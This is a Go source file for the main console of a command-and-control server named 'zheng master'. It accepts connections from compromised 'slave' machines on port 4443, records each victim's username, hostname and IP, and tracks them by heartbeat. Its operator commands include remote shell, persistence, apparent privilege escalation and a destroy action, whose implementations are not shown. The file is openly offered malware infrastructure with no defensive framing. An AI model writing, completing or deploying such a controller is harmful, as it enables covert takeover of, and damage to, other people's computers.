package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"zheng/internal/proto"
)

const port = "4443"

var (
	colorReset  = "\033[0m"
	colorGreen  = "\033[32m"
	colorRed    = "\033[31m"
	colorYellow = "\033[33m"
	colorCyan   = "\033[36m"
	colorBold   = "\033[1m"
)

var reg *registry

func printPrompt() {
	if n := reg.takeNotifications(); n > 0 {
		fmt.Printf("%smaster %s[%d]%s> ", colorBold, colorYellow, n, colorReset)
		return
	}
	fmt.Printf("%smaster%s> ", colorBold, colorReset)
}

// handleConnection performs the recon handshake for a new slave.
func handleConnection(conn net.Conn) {
	var recon proto.Recon
	if err := proto.ReadJSONDeadline(conn, &recon, 10*1e9); err != nil {
		fmt.Fprintf(os.Stderr, "[-] failed to read recon from %s: %v\n", conn.RemoteAddr(), err)
		conn.Close()
		return
	}

	c, reconnect := reg.add(conn, recon)
	reg.notify()
	dbUpsertClient(c.id, recon, c.addr, reconnect)

	syncPrint(func() {
		fmt.Printf("\n%s[+] client %d connected: %s@%s (%s) from %s%s\n",
			colorGreen, c.id, recon.Username, recon.Hostname, recon.IP, c.addr, colorReset)
		printPrompt()
	})
}

// syncPrint prints from goroutines without tearing the active input line.
var stdoutMu sync.Mutex

func syncPrint(f func()) {
	stdoutMu.Lock()
	f()
	stdoutMu.Unlock()
}

func main() {
	initDB()
	defer db.Close()

	reg = newRegistry(dbMaxClientID() + 1)

	listener, err := net.Listen("tcp", ":"+port)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to listen on :%s: %v\n", port, err)
		os.Exit(1)
	}
	defer listener.Close()
	fmt.Fprintf(os.Stderr, "%slistening on :%s%s\n", colorCyan, port, colorReset)

	go acceptLoop(listener)
	go reg.heartbeatWatch(30 * time.Second)

	runConsole()
}

func acceptLoop(l net.Listener) {
	for {
		conn, err := l.Accept()
		if err != nil {
			return
		}
		go handleConnection(conn)
	}
}

func runConsole() {
	fmt.Println("zheng master — /help for commands")
	scanner := bufio.NewScanner(os.Stdin)
	for {
		printPrompt()
		if !scanner.Scan() {
			break
		}
		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}
		parts := strings.Fields(input)
		args := parts[1:]

		switch parts[0] {
		case "/clients":
			cmdClients(reg, args)
		case "/check":
			cmdCheck(reg, args)
		case "/shell":
			cmdShell(reg, args)
		case "/persist":
			cmdPersist(reg, args)
		case "/lpe":
			cmdLPE(reg, args)
		case "/destroy":
			cmdDestroy(reg, args)
		case "/remove":
			cmdRemove(reg, args)
		case "/clear":
			fmt.Print("\033[H\033[2J")
		case "/help", "?":
			fmt.Println(helpText)
		case "/done", "/exit":
			fmt.Println("exiting...")
			for _, id := range reg.ids() {
				reg.remove(id)
			}
			os.Exit(0)
		default:
			fmt.Printf("unknown command: %s\n%s\n", parts[0], helpText)
		}
	}
}
